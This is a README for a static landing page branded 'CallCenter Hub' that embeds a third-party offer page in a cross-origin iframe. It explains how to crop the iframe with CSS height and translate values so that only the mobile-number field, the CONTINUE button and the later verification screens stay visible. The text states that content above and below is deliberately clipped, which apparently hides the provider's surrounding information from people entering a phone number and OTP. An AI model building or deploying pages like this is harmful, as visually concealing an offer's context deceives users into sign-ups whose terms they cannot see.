# CallCenter Hub — Landing Page

A polished responsive landing page with a styled embedded offer viewport.

## Important technical note

The offer is embedded as an iframe:

https://singingfiles.com/show.php?l=0&u=2556396&id=71458

The landing page does **not** read, capture, modify, or submit the phone number or OTP. Those fields remain inside the provider's page.

Because the iframe is cross-origin, browser JavaScript cannot inspect or modify its DOM. The page therefore uses a visual viewport/crop only.

### If the provider blocks iframe embedding

Browsers may block the offer with `X-Frame-Options` or `Content-Security-Policy: frame-ancestors`. In that case the page automatically shows a fallback link to open the provider flow directly.

## Files

- `index.html` — page structure and offer iframe
- `styles.css` — responsive design, effects, cards, animations
- `app.js` — iframe loading/fallback behavior

## Customization

### Change support email

In `index.html`, replace:

`support@example.com`

with your real support email.

### Adjust the visible offer crop

In `styles.css`:

- Desktop: `.offer-frame-wrap { height: 465px; }`
- iframe vertical crop: `#offerFrame { transform: translateY(-62px); }`
- Mobile values are in the `@media (max-width:600px)` block.

These values are intentionally easy to adjust because the provider may render differently on different devices.

## Deployment

This is a static site. It can be deployed to Vercel, Netlify, Cloudflare Pages, GitHub Pages, or any normal web host.

No API key or server is required for this version.

## Before production

Test the exact offer URL on:
1. Android Chrome
2. iPhone Safari
3. Desktop Chrome

Confirm that the provider allows iframe embedding and that the crop still exposes the phone/continue and subsequent verification screens correctly.

If the provider changes its page layout, adjust the iframe height/translate values above.


## V6 iframe crop
The offer viewport is intentionally fixed to show only the mobile-number field and CONTINUE button. Content above/below is clipped visually; the cross-origin provider page itself is not modified.
